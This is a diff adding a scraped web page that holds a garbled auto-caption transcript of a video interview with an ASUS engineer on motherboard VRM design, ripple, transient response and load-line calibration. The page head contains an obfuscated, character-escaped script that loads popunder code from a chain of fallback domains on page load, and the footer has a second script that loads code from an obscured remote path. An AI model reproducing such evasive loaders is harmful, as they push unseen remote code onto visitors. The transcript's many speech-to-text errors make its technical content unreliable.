@@ -1,0 +1,436 @@
+<!DOCTYPE html><html lang="en"><head><script async src="https://www.googletagmanager.com/gtag/js?id=UA-114897551-1"></script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+
+gtag('config', 'UA-114897551-1');
+</script><script type="text/javascript" src="//platform-api.sharethis.com/js/sharethis.js#property=5a9622b05d0b9500130f3375&amp;product=sticky-share-buttons" async="async"></script><title>ASUS Explains Transient Response, VRM Layout Basics, &amp; LLC for Motherboards | Gadgetory - Your Gadget Factory</title><meta content="ASUS Explains Transient Response, VRM Layout Basics, &amp; LLC for Motherboards - All Cool Mind-blowing Gadgets You Love in One Place" name="description"><meta name="keywords" content="unboxing, tech, technology, gadgets, gaming, games, unbox, computers, apple, mac, reviews, iphone, samsung, galaxy, android, review"><meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="stylesheet" href="/css/font.css"><link rel="stylesheet" href="/css/bootstrap.css"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/gadgetory.css"><meta name="google-site-verification" content="75SjvABF8w90SHnCruD-8v2BLGIyqyMoKbjrSrBWO28"></head><script type="text/javascript" data-cfasync="false">/*<![CDATA[/* */
+/* Privet darkv. Each domain is 2h fox dead */
+(function(){ var n=window;n["_\u0070op"]=[["\u0073\x69\x74\x65\u0049\x64",3464215],["m\x69n\x42\x69d",0],["p\x6f\u0070un\u0064\u0065r\x73P\u0065\u0072I\x50",0],["\u0064\x65\x6c\u0061yBe\u0074\x77\u0065\u0065\u006e",0],["\x64\x65fa\x75lt",false],["d\x65\x66aul\x74\u0050\x65r\x44a\u0079",0],["\u0074\u006fp\u006d\u006fs\x74\x4c\u0061\x79er",!0]];var x=["//c\u0031.p\u006f\u0070\u0061d\x73.\x6ee\x74/p\u006f\u0070\x2e\x6a\x73","//c2\u002e\u0070\u006fp\u0061\x64\x73\u002en\u0065t/\u0070o\u0070.\x6a\x73","/\u002f\x77\x77w\u002e\x61p\x63\u0075\x67\u0070x\x79.co\u006d\u002fc\x7ac.js","\x2f/\u0077w\x77\u002e\u0065y\u0074o\u0073\x68a\x62\x2e\u0063\u006f\x6d/\u006d\u0078j\u0063.\x6a\u0073",""],j=0,t,h=function(){if(""==x[j])return;t=n["d\u006fc\u0075m\x65\u006e\x74"]["\u0063\x72eat\u0065\x45l\x65\u006d\x65\u006e\u0074"]("s\u0063\x72\u0069\u0070t");t["\u0074\x79\u0070\u0065"]="\u0074e\u0078t/j\u0061\x76\x61\x73c\x72\u0069\x70t";t["\u0061sync"]=!0;var u=n["\x64o\x63\x75\x6d\x65\x6e\u0074"]["g\x65t\u0045\x6c\u0065men\u0074\x73\x42y\u0054\u0061\x67N\u0061\x6de"]("\x73c\u0072\u0069\x70t")[0];t["\x73r\u0063"]=x[j];if(j<2){t["\u0063\x72\u006f\x73\u0073O\x72i\u0067\u0069\x6e"]="\u0061\x6e\x6fn\u0079\u006d\u006fu\x73";};t["\x6f\x6e\x65r\x72\x6fr"]=function(){j++;h()};u["\x70\x61\u0072\x65\x6e\u0074\x4e\u006fd\x65"]["\u0069\x6e\x73\u0065\u0072\x74B\u0065\x66or\x65"](t,u)};h()})();
+/*]]>/* */
+</script><body><div class="container-fluid"><h1><a href="/">Gadgetory</a></h1><hr><h4 class="text-right">All Cool Mind-blowing Gadgets You Love in One Place</h4></div><div id="amzn-assoc-ad-63fa8890-d7fc-46d2-8bed-ba8231849124"></div><script async src="//z-na.amazon-adsystem.com/widgets/onejs?MarketPlace=US&amp;adInstanceId=63fa8890-d7fc-46d2-8bed-ba8231849124"></script><div class="container"><ol class="breadcrumb"><li><a href="/">Gadgetory</a></li><li><a href="/Gamers-Nexus/">Gamers Nexus</a></li><li class="active">ASUS Explains Transient Response, VRM Layout Basics, &amp; LLC for Motherboards</li></ol></div><h2 class="post__title"><b>ASUS Explains Transient Response, VRM Layout Basics, &amp; LLC for Motherboards</b></h2><h5 class="post__date">2019-07-18</h5><div class="container"><div class="video-responsive"><iframe width="560" height="315" src="https://www.youtube.com/embed/tqvj4CQhRmg" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe></div><div class="post__text">everyone so we were talking with Asus
+about power design and I said you know
+what let's let's stop this and record it
+because a lot of this is over in my head
+so let's just get it on camera and go
+through it for viewership as well and
+I'm joined by Jonathan from Asus he's an
+ro GPM write work on the ROG products
+and we're gonna talk through some
+transient response some load line
+briefly things like that on vrm design
+it's really interesting information
+gives you a basic like a primer on the
+types of things ACS has to think about
+when they're building a PRM and so I
+guess we'll just point out here that
+this is really top-level stuff there
+we're not talking like specific use
+cases or edge cases or anything like
+that we're just primer only yeah so
+don't don't go and try to design a vrm
+with this because you'll need a lot more
+information well go through the basics
+today should be pretty fun and hopefully
+we'll have more content like this before
+that this video is brought to you by us
+and the gamers Nexus toolkit on store
+documents axis net our brand new toolkit
+just launched and contains ten custom
+made drivers for video card disassembly
+reap hasting and tear downs the eight
+core tools are made of high-quality
+chromium vanadium alloys steel that's
+built for long service life and
+resistance to wear during use the other
+two tools are carbon steel hex heads
+that were custom ground down for
+capacitor clearance on video cards all
+the tools are easily mounted to a
+pegboard
+or stored in the GN made tool bag for
+easy transport learn more at the link in
+the description below ok so erm
+structure let's go through this VTR
+controller power status CPU over here
+that I see like steps on the bottom I
+guess so there's two main parts right
+about of erm that people are kind of
+concerned about number one the most
+obvious is thermal performance right if
+people want the components to run cooler
+because it makes it last longer yeah
+yeah and well for thermal for thermal
+performance right it gets a little bit
+confusing because people a lot of people
+think that like adding more phases is
+better and this is true because when you
+add you know a second peter fourth PWM
+signal here you have to add a fourth
+power so now your power load is split
+between four components into three right
+and so when you add more face
+technically it's it's it's bad
+performance therm only better but when
+you're talking about the phase you're
+actually talking about the control
+signal how you're controlling so in our
+solution right now we're actually kind
+of using like more power stages per P
+double control signals running in
+parallel and that spreads the load while
+on you know removing the doublet which
+you know introduced some delay you know
+just an example at these two boards so
+you've got I think these are like the
+same board right except the prm's
+changed yeah so you've got a twin and
+and then an extended phase design yep so
+the heat load on the e-zine what does it
+look like thermally is it is it
+basically do they end up looking the
+same thermally or is like or just twin
+perform better or a while yeah so both
+of these right since the the components
+that are used are exactly the same the
+power spread across the same area and
+the difference is actually over here you
+can see these you can see these little
+tiny eye sees right yeah those are the
+doublers right so basically these had a
+little bit of heat but that's just like
+icy efficiency right
+virtually nothing okay so that's like
+kind of negligible but then over here is
+you know the toe ball comes in over here
+passes through these components and then
+this then goes through you know the
+bicho kind of provide power ultimately
+to the CPU right and we were else
+talking at how you've got the caps kind
+of evenly spaced you know your your
+power your a pen power can I just can't
+necessarily always be closest right
+you're over here right so when it comes
+in over here by the time you get to this
+part of the power plan there's a bit of
+like they can be like some our drop or
+like you know sometimes like the power
+doesn't distribute perfectly evenly
+across this entire distance okay and so
+we these capacitors kind of act as many
+batteries to hold the charge hold the
+charge and then like distribute it when
+necessary right right now these also
+function as you know ripple of ripple
+filtering right which is necessary if
+you know if you're using fewer phases
+right because this is something that is
+a weakness you know
+when you do have less faces this is
+electrical we can get into that in a
+little bit okay detail later but if
+you're concerned about thermal
+performance right what you really need
+to look at is how many power stages you
+have and if power stage is basically an
+ICU that comprises of a driver high side
+MOSFET and a low side MOSFET and
+actually between those three components
+the driver itself actually doesn't add
+any additional heat okay the fact that
+the driver is integrated with the high
+side low side MOSFET the impedances they
+can all be kind of tuned to be more more
+ideal for each other right so it's a
+more efficient package overall okay
+there's two things we were talking about
+mainly there's ripple and then there's
+transient response or I guess right
+these are the two parts that kind of
+cover the electrical performance part of
+okay all right and we just need to make
+sure one that I understand what you're
+talking about and then to that the
+viewer is how much time you're talking
+about so we'll go through I guess top
+level of ripple and a transient response
+so yeah this is the other half to kind
+of more phases as batteries because when
+you have more phases right they turn on
+kind of interns right right then
+basically so 6:16 phase on the
+bright-red yeah
+and then this is actually like the
+amount of ripple and you see it's not it
+doesn't remain constant across all duty
+cycles it changes hmm
+and this is actually like for example
+like the the equation for in pull rebook
+ripple current you can see it depends on
+the phase number it's the current over
+and phase number yeah and this is a
+maximum current I'm going this is the
+duty cycle okay right and so you can see
+over here like when you you know when
+you have less phases fewer phases right
+ripple is worse and as you get higher
+though you kind of see from 8 to 16 it
+kind of starts getting into a
+diminishing returns right and then right
+this is what we were talking about with
+the capacitors earlier where you can
+have input filtering also to kind of
+reduce like you know the input current
+to kind of not reduce it but to buffer
+the input input current and you know in
+general right like one capacitor ours is
+rated for five five thousand lamps which
+is you know so we've got a ripple
+current of under 16 on for phase 15 15
+amps over there
+poor face yeah and so then you know you
+won't need as many capacitors as what we
+put on the board itself right which is
+why you know sometimes you might see
+like okay like one generation has fewer
+technical phases than another one right
+but the capacitance have remained the
+same is because you know the primary
+reason for why we're using those
+capacitors is actually not because
+ripple is an issue it's because of you
+know the you didn't write the input okay
+to buffer the 12 volt keep it stable to
+the BRM doubt it so now let's get into
+kind of like transient okay sure I'm so
+like what is transient response and like
+why is it important and so like I we
+were talking earlier right like this
+this is very simple sorry P equals it
+goes be VI right this is just power as
+both there's times current right is
+fairly easy to understand so what
+happens like you know when you're when
+you're providing power over to the CPU
+right as soon as the CPU kind of hits a
+high loader it's that's drawing more
+current right and so you got the current
+sense over here oh all right so the
+current sense has to come back to the PW
+has a feedback information to the PWM
+controller before the PWM and controller
+can start saying okay I need to give
+this I need to provide more current
+right so if you can imagine right if for
+example we're giving maybe like we're
+giving like maybe like 50 watts of power
+right if your current is starting to
+spike up you know it goes off from like
+you know 40 amps to like you know 100
+amps right yeah well if you're talking
+about like 50 watts of power distributed
+between these two numbers right this is
+like this is gonna be like 0.2 volts
+this is gonna be all I just a really bad
+number um but you know much bigger than
+it's gonna be
+should we calculate it yeah we could all
+right so we we're gonna cut ahead a bit
+so that we can save some time I'm just
+plotting that it grabs and everything
+okay so so what are we looking at right
+now so right now you know this is the V
+tour this is the current and it's
+plotted against time right and so we
+have to pin it you have like V 2 and V 1
+right here these dotted lines they
+represent a grid okay all right they
+represent like young this is at the same
+point so I say
+old Asian right same time on this and
+the scale on each one okay and so what
+happens is when you know your current
+kind of spikes up right mmm ideal world
+you'd be at the cutting your voltage of
+you at the drop and then basically
+stabilized right away to level out yeah
+well kind of match up the numbers have
+to align up right and so when you're
+when you're reacting over here it comes
+what actually ends up happening it
+usually there's a little bit of a
+because there's a lag time before when
+the people in control that can react to
+these so I guess ideally in a perfect
+world where you have no constraints you
+know basically a kind of square wave yep
+or it just it squares out at the edges
+on each of them but in reality you're
+you're on is this yes under shoot a
+different thing is that is it correct
+use the phrase under shoot for this or
+now uh or is that a different tactical
+term undershoot understand fun things
+you the term mom you guys long block
+yeah technically that's a different
+thing no that's that's correct okay but
+then you're getting into a lot of
+different ok well let's let's go back
+what you're saying that um so the we
+forego that for now um so let me brown
+these out okay so that you know so this
+is more of the this is more value what
+really happens but you know it at the
+same time frame kind of still flies here
+right so this will this will kind of dip
+right and then basically what happens
+what's happening over here right is
+because of you know P equals bi right
+the currents increasing right and the
+video the few moon control still taking
+time to react huh so the way you tune it
+is you start replenishing current at
+this point and the will make happen is
+in my kind of in my kind of increase
+over I say your party of v1 and then
+maybe under a little bit and then and
+then stabilized takes it a little bit to
+fit to to level out to where it needs to
+be right and what what's happening over
+here is this duration right you want
+this to kind of stabilize quickly and
+you have to make sure this this first
+peak is not it's not too low not too
+extreme yeah
+okay and so what is v1 and v2 you might
+be kind of like asking is like why does
+why does the voltage you can change
+right well if you're if you remember
+right you have what's called a DC load
+line uh-huh yeah right and that is the
+load line looks something like this
+so basically you know I took her and is
+going up right this is this this drop to
+this drop up here that's your low like
+taking effect okay and this is why I'm
+getting the load line is because like a
+lot of people control concerned about
+the electrical performance because they
+want the best overclocking capability
+right and a lot of people will think
+that like a zero low line is usually
+like the ideal scenario but what happens
+when you have a zero low line is you're
+basically forcing the voltage to try to
+stay at like v2 all the time okay and so
+what will happen is you know if you
+don't have a an appropriately steep low
+line right mm-hmm
+this reaction right here will increase
+as low line gets flatter okay
+so if you had like a low line let me if
+we're done with this let me yeah sure
+clean this real plank so if we so if we
+applied this over here this is this will
+basically look like this right
+b1 and they wanted me to okay this is
+basically working at I won this is a tie
+to and then if you have a shallower low
+line or if you have like a really flat
+low line right basically I won this will
+be this will be kind of the one prior
+asset okay and then e2 would price
+they'd say so basically it looked like I
+say basically this this will be like
+much bigger okay and then the selling
+time would be actually much long with a
+shallower load line yeah and so that's
+like that's why you would need maybe
+like that's why you need to kind of play
+around with you know your arms a lot
+right um I mean I think there is some
+truth to having a shallow line because I
+mean in general if the report is tuned
+very well right for the CPU
+characteristics I think you can get you
+can general get away with the shallower
+load line where you can because it can
+react properly and kind of dampen you
+know some of the ball to stabilize
+either stabilize the current quickly
+enough right but get like a perfectly
+flat load line for any CRM is actually
+extremely difficult order line I think
+um so that's kind of a quick primer on
+transient response with a little bit
+kind of scuffle around a little bit of
+my little story yeah okay part of the
+ladder that later date up right the
+importance of that is just that you know
+when you're talking about transient
+response like the magnitude of the the V
+min right that's like at like something
+like 50 millivolts right but then your
+ripple the difference between the two
+ripple is like something within 5
+millivolts right right so it's like a
+magnitude greater you know of an issue
+than ripple even though ripple is
+something that you see may maybe
+constantly right but because you know as
+we said like the difference in CPU
+characteristics now because of the piece
+CJ yeah cuz of power saving the turbo
+boosts turbo booster then just having
+more chorus right
+having that dynamic current swing right
+it really changed our priorities yeah
+you know this is current prophecy yeah I
+mean if you remember we were stuck at
+four cores for like years yeah and not
+just that though if you think about like
+just like like something like three
+years ago x99 yeah but the King of Kings
+was the ten core you know recommendation
+process right now we're at eight cores
+on you know on top it's like we're kind
+of like baffled
+you know also everybody's like oh oh
+yeah I think he's selling a portable
+game well like we want more performance
+right and I guess this is what can be
+done at yeah point right now that's
+seems to be the trend of what's going on
+yeah oh we're just kind of going with
+the flow right you have to adjust the
+designs to match it yeah and so you know
+there's merits to everything you know
+everything's you know nothing's perfect
+right there's trade-offs you're always
+gonna have to make well you have time
+and cost - yeah time and money is the
+ultimate decider on just about
+everything so yeah yeah cool well I
+guess that'll give you a brief
+run-through of some basics from vrm
+basics so we'll we'll throw to
+potentially build Zoid video in the
+future with further discussion on all
+the stuff here today and thank you for
+joining me thank you we'll see you all
+next time</div></div><div class="container-fluid bottom-ad"><div id="amzn-assoc-ad-aff413cd-a2b9-4185-aaaf-46d2235c9ff4"></div><script async src="//z-na.amazon-adsystem.com/widgets/onejs?MarketPlace=US&amp;adInstanceId=aff413cd-a2b9-4185-aaaf-46d2235c9ff4"></script></div><div class="text-center">We are a participant in the Amazon Services LLC Associates Program, an affiliate advertising program designed to provide a means for us to earn fees by linking to Amazon.com and affiliated sites.</div><script>(function(w, d){
+    var b = d.getElementsByTagName('body')[0];
+    var s = d.createElement("script"); s.async = true;
+    var v = !("IntersectionObserver" in w) ? "8.6.0" : "10.4.2";
+    s.src = "https://cdnjs.cloudflare.com/ajax/libs/vanilla-lazyload/" + v + "/lazyload.min.js";
+    w.lazyLoadOptions = {};
+    b.appendChild(s);
+}(window, document));
+</script><div id="amzn-assoc-ad-8d36b5d0-d747-44e0-a19e-c35686058d93"></div><script async src="//z-na.amazon-adsystem.com/widgets/onejs?MarketPlace=US&amp;adInstanceId=8d36b5d0-d747-44e0-a19e-c35686058d93"></script><script>(function(__htas){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = __htas || {};
+s.src = "\/\/finized.co\/cCD\/9G6.bP2H5slHS\/WAQ\/9\/NRDFECwSO_T-Q\/4sMFyU0K0kM-TtAT5mNgDsgy0d";
+l.parentNode.insertBefore(s, l);
+})({})</script></body></html>
